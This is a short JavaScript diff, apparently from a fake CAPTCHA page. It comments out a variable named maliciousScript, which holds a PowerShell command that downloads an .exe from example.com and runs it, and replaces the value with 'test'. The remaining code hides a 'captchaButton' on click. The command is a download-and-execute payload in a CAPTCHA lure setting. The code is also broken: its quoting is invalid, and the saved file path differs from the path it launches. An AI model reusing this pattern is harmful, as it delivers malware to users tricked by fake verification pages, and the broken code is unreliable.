@@ -1,4 +1,6 @@
-const maliciousScript = "powershell -Command "Invoke-WebRequest -Uri 'https://example.com/file.exe' -OutFile 'C:\ruta\al\archivo\archivo.exe'; Start-Process 'C:\path\to\file\file.exe'"";
+// const maliciousScript = "powershell -Command "Invoke-WebRequest -Uri 'https://example.com/file.exe' -OutFile 'C:\ruta\al\archivo\archivo.exe'; Start-Process 'C:\path\to\file\file.exe'"";
+const maliciousScript = "test"
+
 
 document.getElementById('captchaButton').addEventListener('click', function() {
     document.getElementById('captchaButton').style.display = 'none';
